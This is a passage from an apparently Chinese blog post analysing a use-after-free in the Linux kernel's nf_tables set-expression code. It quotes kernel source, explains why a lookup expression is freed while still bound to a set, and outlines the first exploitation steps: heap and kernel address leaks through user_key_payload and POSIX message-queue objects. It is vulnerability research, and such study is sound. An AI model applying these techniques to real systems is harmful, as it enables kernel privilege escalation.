class="title">nft_set_elem_expr_alloc</span><span class="params">(<span class="keyword">const</span> struct nft_ctx *ctx,</span></span></span><br><span class="line"><span class="params"><span class="function"> <span class="keyword">const</span> struct nft_set *<span class="built_in">set</span>,</span></span></span><br><span class="line"><span class="params"><span class="function"> <span class="keyword">const</span> struct nlattr *attr)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">nft_expr</span> *<span class="title">expr</span>;</span></span><br><span class="line"><span class="keyword">int</span> err;e</span><br><span class="line"></span><br><span class="line">expr = nft_expr_init(ctx, attr);</span><br><span class="line"><span class="keyword">if</span> (IS_ERR(expr))</span><br><span class="line"><span class="keyword">return</span> expr;</span><br><span class="line"></span><br><span class="line">err = -EOPNOTSUPP;</span><br><span class="line"><span class="keyword">if</span> (!(expr-&gt;ops-&gt;type-&gt;flags &amp; NFT_EXPR_STATEFUL))</span><br><span class="line"><span class="keyword">goto</span> err_set_elem_expr;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (expr-&gt;ops-&gt;type-&gt;flags &amp; NFT_EXPR_GC) &#123;</span><br><span class="line"><span class="keyword">if</span> (<span class="built_in">set</span>-&gt;flags &amp; NFT_SET_TIMEOUT)</span><br><span class="line"><span class="keyword">goto</span> err_set_elem_expr;</span><br><span class="line"><span class="keyword">if</span> (!<span class="built_in">set</span>-&gt;ops-&gt;gc_init)</span><br><span class="line"><span class="keyword">goto</span> err_set_elem_expr;</span><br><span class="line"><span class="built_in">set</span>-&gt;ops-&gt;gc_init(<span class="built_in">set</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> expr;</span><br><span class="line"></span><br><span class="line">err_set_elem_expr:</span><br><span class="line">nft_expr_destroy(ctx, expr);</span><br><span class="line"><span class="keyword">return</span> ERR_PTR(err);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>在函数开头就调用了<code>nft_expr_init</code>进行初始化。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> struct nft_expr *<span class="title">nft_expr_init</span><span class="params">(<span class="keyword">const</span> struct nft_ctx *ctx,</span></span></span><br><span class="line"><span class="params"><span class="function">      <span class="keyword">const</span> struct nlattr *nla)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">nft_expr_info</span> <span class="title">expr_info</span>;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">nft_expr</span> *<span class="title">expr</span>;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">module</span> *<span class="title">owner</span>;</span></span><br><span class="line"><span class="keyword">int</span> err;</span><br><span class="line"></span><br><span class="line">err = nf_tables_expr_parse(ctx, nla, &amp;expr_info);</span><br><span class="line"><span class="keyword">if</span> (err &lt; <span class="number">0</span>)</span><br><span class="line"><span class="keyword">goto</span> err_expr_parse;</span><br><span class="line"></span><br><span class="line">err = -EOPNOTSUPP;</span><br><span class="line"><span class="keyword">if</span> (!(expr_info.ops-&gt;type-&gt;flags &amp; NFT_EXPR_STATEFUL))</span><br><span class="line"><span class="keyword">goto</span> err_expr_stateful;</span><br><span class="line"></span><br><span class="line">err = -ENOMEM;</span><br><span class="line">expr = kzalloc(expr_info.ops-&gt;size, GFP_KERNEL);</span><br><span class="line"><span class="keyword">if</span> (expr == <span class="literal">NULL</span>)</span><br><span class="line"><span class="keyword">goto</span> err_expr_stateful;</span><br><span class="line"></span><br><span class="line">err = nf_tables_newexpr(ctx, &amp;expr_info, expr);</span><br><span class="line"><span class="keyword">if</span> (err &lt; <span class="number">0</span>)</span><br><span class="line"><span class="keyword">goto</span> err_expr_new;</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> expr;</span><br><span class="line">err_expr_new:</span><br><span class="line">kfree(expr);</span><br><span class="line">err_expr_stateful:</span><br><span class="line">owner = expr_info.ops-&gt;type-&gt;owner;</span><br><span class="line"><span class="keyword">if</span> (expr_info.ops-&gt;type-&gt;release_ops)</span><br><span class="line">expr_info.ops-&gt;type-&gt;release_ops(expr_info.ops);</span><br><span class="line"></span><br><span class="line">module_put(owner);</span><br><span class="line">err_expr_parse:</span><br><span class="line"><span class="keyword">return</span> ERR_PTR(err);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>可以看到这里就出现了我们比较熟悉的两个函数了<code>nf_tables_expr_parse</code>，<code>nf_tables_newexpr</code>。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">nft_expr</span> &#123;</span></span><br><span class="line"><span class="keyword">const</span> <span class="class"><span class="keyword">struct</span> <span class="title">nft_expr_ops</span>*<span class="title">ops</span>;</span></span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">char</span>data[]</span><br><span class="line">__attribute__((aligned(__alignof__(u64))));</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">inline</span> <span class="keyword">void</span> *<span class="title">nft_expr_priv</span><span class="params">(<span class="keyword">const</span> struct nft_expr *expr)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">return</span> (<span class="keyword">void</span> *)expr-&gt;data;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">int</span> <span class="title">nft_lookup_init</span><span class="params">(<span class="keyword">const</span> struct nft_ctx *ctx,</span></span></span><br><span class="line"><span class="params"><span class="function">   <span class="keyword">const</span> struct nft_expr *expr,</span></span></span><br><span class="line"><span class="params"><span class="function">   <span class="keyword">const</span> struct nlattr * <span class="keyword">const</span> tb[])</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">nft_lookup</span> *<span class="title">priv</span> =</span> nft_expr_priv(expr);</span><br><span class="line">u8 genmask = nft_genmask_next(ctx-&gt;net);</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">nft_set</span> *<span class="title">set</span>;</span></span><br><span class="line">u32 flags;</span><br><span class="line"><span class="keyword">int</span> err;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (tb[NFTA_LOOKUP_SET] == <span class="literal">NULL</span> ||</span><br><span class="line">    tb[NFTA_LOOKUP_SREG] == <span class="literal">NULL</span>)</span><br><span class="line"><span class="keyword">return</span> -EINVAL;</span><br><span class="line"></span><br><span class="line"><span class="built_in">set</span> = nft_set_lookup_global(ctx-&gt;net, ctx-&gt;table, tb[NFTA_LOOKUP_SET],</span><br><span class="line">    tb[NFTA_LOOKUP_SET_ID], genmask);</span><br><span class="line"><span class="keyword">if</span> (IS_ERR(<span class="built_in">set</span>))</span><br><span class="line"><span class="keyword">return</span> PTR_ERR(<span class="built_in">set</span>);</span><br><span class="line"></span><br><span class="line">err = nft_parse_register_load(tb[NFTA_LOOKUP_SREG], &amp;priv-&gt;sreg,</span><br><span class="line">      <span class="built_in">set</span>-&gt;klen);</span><br><span class="line"><span class="keyword">if</span> (err &lt; <span class="number">0</span>)</span><br><span class="line"><span class="keyword">return</span> err;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (tb[NFTA_LOOKUP_FLAGS]) &#123;</span><br><span class="line">flags = ntohl(nla_get_be32(tb[NFTA_LOOKUP_FLAGS]));</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (flags &amp; ~NFT_LOOKUP_F_INV)</span><br><span class="line"><span class="keyword">return</span> -EINVAL;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (flags &amp; NFT_LOOKUP_F_INV) &#123;</span><br><span class="line"><span class="keyword">if</span> (<span class="built_in">set</span>-&gt;flags &amp; NFT_SET_MAP)</span><br><span class="line"><span class="keyword">return</span> -EINVAL;</span><br><span class="line">priv-&gt;invert = <span class="literal">true</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (tb[NFTA_LOOKUP_DREG] != <span class="literal">NULL</span>) &#123;</span><br><span class="line"><span class="keyword">if</span> (priv-&gt;invert)</span><br><span class="line"><span class="keyword">return</span> -EINVAL;</span><br><span class="line"><span class="keyword">if</span> (!(<span class="built_in">set</span>-&gt;flags &amp; NFT_SET_MAP))</span><br><span class="line"><span class="keyword">return</span> -EINVAL;</span><br><span class="line"></span><br><span class="line">err = nft_parse_register_store(ctx, tb[NFTA_LOOKUP_DREG],</span><br><span class="line">       &amp;priv-&gt;dreg, <span class="literal">NULL</span>, <span class="built_in">set</span>-&gt;dtype,</span><br><span class="line">       <span class="built_in">set</span>-&gt;dlen);</span><br><span class="line"><span class="keyword">if</span> (err &lt; <span class="number">0</span>)</span><br><span class="line"><span class="keyword">return</span> err;</span><br><span class="line">&#125; <span class="keyword">else</span> <span class="keyword">if</span> (<span class="built_in">set</span>-&gt;flags &amp; NFT_SET_MAP)</span><br><span class="line"><span class="keyword">return</span> -EINVAL;</span><br><span class="line"></span><br><span class="line">priv-&gt;binding.flags = <span class="built_in">set</span>-&gt;flags &amp; NFT_SET_MAP;</span><br><span class="line"></span><br><span class="line">err = nf_tables_bind_set(ctx, <span class="built_in">set</span>, &amp;priv-&gt;binding);</span><br><span class="line"><span class="keyword">if</span> (err &lt; <span class="number">0</span>)</span><br><span class="line"><span class="keyword">return</span> err;</span><br><span class="line"></span><br><span class="line">priv-&gt;<span class="built_in">set</span> = <span class="built_in">set</span>;</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>按照上面的分析此时就该调用<code>nft_lookup_init</code>函数了，这里主要需要注意的是最后一步操作，就是将<code>priv</code>绑定到<code>set</code>上。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br></pre></td><td class="code"><pre><span class="line">  <span class="keyword">static</span> <span class="keyword">inline</span> <span class="keyword">void</span> __list_add_rcu(struct list_head *<span class="keyword">new</span>,</span><br><span class="line">struct list_head *prev, struct list_head *next)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">if</span> (!__list_add_valid(<span class="keyword">new</span>, prev, next))</span><br><span class="line"><span class="keyword">return</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">new</span>-&gt;next = next;</span><br><span class="line"><span class="keyword">new</span>-&gt;prev = prev;</span><br><span class="line">rcu_assign_pointer(list_next_rcu(prev), <span class="keyword">new</span>);</span><br><span class="line">next-&gt;prev = <span class="keyword">new</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">inline</span> <span class="keyword">void</span> <span class="title">list_add_tail_rcu</span><span class="params">(struct list_head *<span class="keyword">new</span>,</span></span></span><br><span class="line"><span class="params"><span class="function">struct list_head *head)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">__list_add_rcu(<span class="keyword">new</span>, head-&gt;prev, head);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">nft_set_binding</span> &#123;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">list_head</span><span class="title">list</span>;</span></span><br><span class="line"><span class="keyword">const</span> <span class="class"><span class="keyword">struct</span> <span class="title">nft_chain</span>*<span class="title">chain</span>;</span></span><br><span class="line">u32flags;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">nft_lookup</span> &#123;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">nft_set</span>*<span class="title">set</span>;</span></span><br><span class="line">u8sreg;</span><br><span class="line">u8dreg;</span><br><span class="line"><span class="keyword">bool</span>invert;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">nft_set_binding</span><span class="title">binding</span>;</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">nf_tables_bind_set</span><span class="params">(<span class="keyword">const</span> struct nft_ctx *ctx, struct nft_set *<span class="built_in">set</span>,</span></span></span><br><span class="line"><span class="params"><span class="function">       struct nft_set_binding *binding)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">nft_set_binding</span> *<span class="title">i</span>;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">nft_set_iter</span> <span class="title">iter</span>;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="built_in">set</span>-&gt;use == UINT_MAX)</span><br><span class="line"><span class="keyword">return</span> -EOVERFLOW;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (!list_empty(&amp;<span class="built_in">set</span>-&gt;bindings) &amp;&amp; nft_set_is_anonymous(<span class="built_in">set</span>))</span><br><span class="line"><span class="keyword">return</span> -EBUSY;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (binding-&gt;flags &amp; NFT_SET_MAP) &#123;</span><br><span class="line"><span class="comment">/* If the set is already bound to the same chain all</span></span><br><span class="line"><span class="comment"> * jumps are already validated for that chain.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line">list_for_each_entry (i, &amp;<span class="built_in">set</span>-&gt;bindings, <span class="built_in">list</span>) &#123;</span><br><span class="line"><span class="keyword">if</span> (i-&gt;flags &amp; NFT_SET_MAP &amp;&amp;</span><br><span class="line">    i-&gt;chain == binding-&gt;chain)</span><br><span class="line"><span class="keyword">goto</span> bind;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">iter.genmask = nft_genmask_next(ctx-&gt;net);</span><br><span class="line">iter.skip = <span class="number">0</span>;</span><br><span class="line">iter.count = <span class="number">0</span>;</span><br><span class="line">iter.err = <span class="number">0</span>;</span><br><span class="line">iter.fn = nf_tables_bind_check_setelem;</span><br><span class="line"></span><br><span class="line"><span class="built_in">set</span>-&gt;ops-&gt;walk(ctx, <span class="built_in">set</span>, &amp;iter);</span><br><span class="line"><span class="keyword">if</span> (!iter.err)</span><br><span class="line">iter.err = nft_set_catchall_bind_check(ctx, <span class="built_in">set</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (iter.err &lt; <span class="number">0</span>)</span><br><span class="line"><span class="keyword">return</span> iter.err;</span><br><span class="line">&#125;</span><br><span class="line">bind:</span><br><span class="line">binding-&gt;chain = ctx-&gt;chain;</span><br><span class="line">list_add_tail_rcu(&amp;binding-&gt;<span class="built_in">list</span>, &amp;<span class="built_in">set</span>-&gt;bindings);</span><br><span class="line">nft_set_trans_bind(ctx, <span class="built_in">set</span>);</span><br><span class="line"><span class="built_in">set</span>-&gt;use++;</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>回到<code>nft_set_elem_expr_alloc</code>函数中若是我们控制走向<code>err_set_elem_expr</code>分支即可销毁<code>expr</code>。</p><p>当<code>if (!(expr-&gt;ops-&gt;type-&gt;flags &amp; NFT_EXPR_STATEFUL))</code>满足是会进入到<code>err_set_elem_expr</code>分支中，正好我们使用的<code>type</code>中是不存在这个东西的。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">nf_tables_destroy_set</span><span class="params">(<span class="keyword">const</span> struct nft_ctx *ctx, struct nft_set *<span class="built_in">set</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">if</span> (list_empty(&amp;<span class="built_in">set</span>-&gt;bindings) &amp;&amp; nft_set_is_anonymous(<span class="built_in">set</span>))</span><br><span class="line">nft_set_destroy(ctx, <span class="built_in">set</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">void</span> <span class="title">nft_lookup_destroy</span><span class="params">(<span class="keyword">const</span> struct nft_ctx *ctx,</span></span></span><br><span class="line"><span class="params"><span class="function">       <span class="keyword">const</span> struct nft_expr *expr)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">nft_lookup</span> *<span class="title">priv</span> =</span> nft_expr_priv(expr);</span><br><span class="line"></span><br><span class="line">nf_tables_destroy_set(ctx, priv-&gt;<span class="built_in">set</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">void</span> <span class="title">nf_tables_expr_destroy</span><span class="params">(<span class="keyword">const</span> struct nft_ctx *ctx,</span></span></span><br><span class="line"><span class="params"><span class="function">   struct nft_expr *expr)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">const</span> <span class="class"><span class="keyword">struct</span> <span class="title">nft_expr_type</span> *<span class="title">type</span> =</span> expr-&gt;ops-&gt;type;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (expr-&gt;ops-&gt;destroy)</span><br><span class="line">expr-&gt;ops-&gt;destroy(ctx, expr);</span><br><span class="line">module_put(type-&gt;owner);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">nft_expr_destroy</span><span class="params">(<span class="keyword">const</span> struct nft_ctx *ctx, struct nft_expr *expr)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">nf_tables_expr_destroy(ctx, expr);</span><br><span class="line">kfree(expr);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>根据这里的调用关系可以看到，其实最终实现的就只是单单<code>kfree</code>了个<code>expr</code>，而并没有脱链之类的操作，那么此时就发生了<code>UAF</code>。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">static</span> <span class="keyword">const</span> <span class="class"><span class="keyword">struct</span> <span class="title">nft_expr_ops</span> <span class="title">nft_lookup_ops</span> =</span> &#123;</span><br><span class="line">.type= &amp;nft_lookup_type,</span><br><span class="line">.size= NFT_EXPR_SIZE(<span class="keyword">sizeof</span>(struct nft_lookup)),</span><br><span class="line">.eval= nft_lookup_eval,</span><br><span class="line">.init= nft_lookup_init,</span><br><span class="line">.activate= nft_lookup_activate,</span><br><span class="line">.deactivate= nft_lookup_deactivate,</span><br><span class="line">.destroy= nft_lookup_destroy,</span><br><span class="line">.dump= nft_lookup_dump,</span><br><span class="line">.validate= nft_lookup_validate,</span><br><span class="line">.reduce= nft_lookup_reduce,</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">nft_expr_type</span> <span class="title">nft_lookup_type</span> __<span class="title">read_mostly</span> =</span> &#123;</span><br><span class="line">.name= <span class="string">&quot;lookup&quot;</span>,</span><br><span class="line">.ops= &amp;nft_lookup_ops,</span><br><span class="line">.policy= nft_lookup_policy,</span><br><span class="line">.maxattr= NFTA_LOOKUP_MAX,</span><br><span class="line">.owner= THIS_MODULE,</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>然而<code>lookup</code>的<code>expre</code>的<code>flag</code>位恰好没有<code>NFT_EXPR_STATEFUL</code>标识位。</p><h2 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h2><h3 id="泄漏堆地址"><a href="#泄漏堆地址" class="headerlink" title="泄漏堆地址"></a>泄漏堆地址</h3><p>其实上述漏洞存在很大的局限性，在触发到<code>UAF</code>之后，唯一能做到的一件事就是修改<code>(struct nft_lookup *)(expr-&gt;data)-&gt;binding-&gt;next</code>指针指向新生成的<code>new_expr</code>。</p><p><code>expr = kzalloc(expr_info.ops-&gt;size, GFP_KERNEL);</code>在上一篇文章提到了内核内存隔离这一说，因为标识位的不同导致无法使用很多已有结构体。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">user_key_payload</span> &#123;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">rcu_head</span><span class="title">rcu</span>;</span><span class="comment">/* RCU destructor */</span></span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">short</span>datalen;<span class="comment">/* length of this data */</span></span><br><span class="line"><span class="keyword">char</span>data[] __aligned(__alignof__(u64)); <span class="comment">/* actual data */</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>上面<code>next</code>指针的偏移正好为<code>0x18</code>而这里的<code>data</code>数组是用户可控，那么可以通过触发uaf之后泄漏出堆地址。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">user_preparse</span><span class="params">(struct key_preparsed_payload *prep)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">user_key_payload</span> *<span class="title">upayload</span>;</span></span><br><span class="line"><span class="keyword">size_t</span> datalen = prep-&gt;datalen;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (datalen &lt;= <span class="number">0</span> || datalen &gt; <span class="number">32767</span> || !prep-&gt;data)</span><br><span class="line"><span class="keyword">return</span> -EINVAL;</span><br><span class="line"></span><br><span class="line">upayload = kmalloc(<span class="keyword">sizeof</span>(*upayload) + datalen, GFP_KERNEL);</span><br><span class="line"><span class="keyword">if</span> (!upayload)</span><br><span class="line"><span class="keyword">return</span> -ENOMEM;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* attach the data */</span></span><br><span class="line">prep-&gt;quotalen = datalen;</span><br><span class="line">prep-&gt;payload.data[<span class="number">0</span>] = upayload;</span><br><span class="line">upayload-&gt;datalen = datalen;</span><br><span class="line"><span class="built_in">memcpy</span>(upayload-&gt;data, prep-&gt;data, datalen);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line">EXPORT_SYMBOL_GPL(user_preparse);</span><br></pre></td></tr></table></figure><p>并且可以注意到他的申请参数也为<code>GFP_KERNEL</code>。</p><h3 id="泄漏内核地址"><a href="#泄漏内核地址" class="headerlink" title="泄漏内核地址"></a>泄漏内核地址</h3><p>这里用到的是mqueue中的posix消息队列模块，该模块和msg_msg一样是IPC进程间通信的消息队列功能。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">rb_node</span> &#123;</span></span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">long</span>  __rb_parent_color;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">rb_node</span> *<span class="title">rb_right</span>;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">rb_node</span> *<span class="title">rb_left</span>;</span></span><br><span class="line">&#125; __attribute__((aligned(<span class="keyword">sizeof</span>(<span class="keyword">long</span>))));</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">posix_msg_tree_node</span> &#123;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">rb_node</span><span class="title">rb_node</span>;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">list_head</span><span class="title">msg_list</span>;</span></span><br><span class="line"><span class="keyword">int</span>priority;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>可以看到<code>posix_msg_tree_node</code>的next指针刚好落在了0x18这个位置。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span 